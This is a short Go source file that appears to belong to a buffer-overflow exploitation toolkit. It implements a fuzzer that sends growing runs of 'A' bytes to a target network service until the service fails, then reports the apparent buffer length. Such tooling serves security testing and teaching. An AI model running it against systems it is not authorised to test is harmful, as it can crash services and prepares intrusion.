package overflow

import (
    "fmt"
    "net"
    "time"
)

// ...
type Fuzz struct {
    step int
    wait int
}

// ...
func NewFuzz(step int, wait int) Fuzz {
    return Fuzz{ step, wait }
}

// ...
func (f Fuzz) Run(host Host, tmpl string) {
    // ...
    var err error
    var length int

    // ...
    for length = f.step; err == nil; length += f.step {
        err = f.SendLength(host, tmpl, length)
        time.Sleep(time.Duration(f.wait) * time.Millisecond)
    }

    // no payload was sent, an error occurred
    if length - f.step == f.step {
        fmt.Printf("\n error: %s\n", err.(*net.OpError).Err)
        return
    }

    // print buffer information
    fmt.Printf("\n success: len of buffer is in range (%d, %d]\n",
        length - f.step - f.step, length - f.step)
}

// ...
func (f Fuzz) SendLength(host Host, tmpl string, length int) error {
    // create n-byte byte array
    data := generateBytes(0x41, length)

    // build payload
    fmt.Println(" > building payload")
    payload := Payload{ data, tmpl }

    // send payload to target service
    fmt.Printf(" > sending %d-byte payload\n", payload.Size())
    return host.SendPayload(payload)
}

